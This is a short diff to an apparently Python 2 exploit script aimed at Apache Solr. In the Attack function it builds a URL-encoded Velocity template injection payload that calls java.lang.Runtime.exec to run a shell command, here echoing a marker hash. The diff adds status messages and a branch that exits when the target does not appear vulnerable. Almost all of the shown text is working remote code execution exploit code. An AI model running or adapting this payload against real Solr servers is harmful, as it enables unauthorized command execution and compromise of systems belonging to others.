@@ -58,6 +58,8 @@ def ModifyConfig(tgtUrl,pathName):
     
 
 def Attack(tgtUrl,pathName):
+
+    print 'Attacking...'
     
     attack_url = tgtUrl + "/solr/"+ pathName +"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27echo%205594bf8e87f93172f046278b005e3082%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
     
@@ -78,6 +80,9 @@ def Attack(tgtUrl,pathName):
                break
           cmdResult = requests.post(attack_url,headers=attack_headers,verify=False)
           print cmdResult.text.encode('utf-8')
+    else:
+	print 'Target seem not vulnerable!'
+	sys.exit()
 
 
 if __name__ == '__main__':
